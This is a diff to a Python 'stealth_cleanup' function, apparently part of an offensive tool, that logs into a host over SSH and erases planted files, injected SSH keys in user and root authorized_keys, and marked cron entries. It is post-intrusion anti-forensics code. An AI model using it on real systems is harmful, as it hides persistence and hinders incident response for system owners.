@@ -67,14 +67,19 @@ def stealth_cleanup(host: str, user: str, password: str, port: int = 22) -> str:
         if pending:
             print(f"    {C_CYAN}[*] Found {len(pending)} tracked artifacts to clean.{C_RESET}")
             for art in pending:
-                if art["type"] == "file":
-                    _ssh_exec(client, f"rm -f {art['path']} 2>/dev/null", timeout=5)
-                elif art["type"] == "ssh_key":
-                    _ssh_exec(client, f"sed -i '/{art['comment']}/Id' ~/.ssh/authorized_keys 2>/dev/null", timeout=5)
-                    _ssh_exec(client, f"sed -i '/{art['comment']}/Id' /root/.ssh/authorized_keys 2>/dev/null", timeout=5)
-                elif art["type"] == "cron":
-                    _ssh_exec(client, f"crontab -l 2>/dev/null | grep -v '{art['marker']}' | crontab - 2>/dev/null", timeout=5)
-                am.mark_cleaned(art.get("path") or art.get("comment") or art.get("marker"))
+                art_type = art.get("type") or art.get("artifact_type")
+                marker = art.get("marker") or art.get("comment") or ""
+                path = art.get("path") or ""
+                if art_type == "file" and path:
+                    _ssh_exec(client, f"rm -f {path} 2>/dev/null", timeout=5)
+                elif art_type == "ssh_key" and marker:
+                    _ssh_exec(client, f"sed -i '/{marker}/Id' ~/.ssh/authorized_keys 2>/dev/null", timeout=5)
+                    _ssh_exec(client, f"sed -i '/{marker}/Id' /root/.ssh/authorized_keys 2>/dev/null", timeout=5)
+                elif art_type == "cron" and marker:
+                    _ssh_exec(client, f"crontab -l 2>/dev/null | grep -v '{marker}' | crontab - 2>/dev/null", timeout=5)
+                identifier = path or marker
+                if identifier:
+                    am.mark_cleaned(identifier)
             output += f"[+] Deterministic artifact cleanup complete ({len(pending)} items)\n"
     except ImportError:
         pass
@@ -173,6 +178,5 @@ def stealth_cleanup(host: str, user: str, password: str, port: int = 22) -> str:
         print(f"\n    {C_GREEN}[+] Cleanup session closed.{C_RESET}")
 
     return output
-
 
 
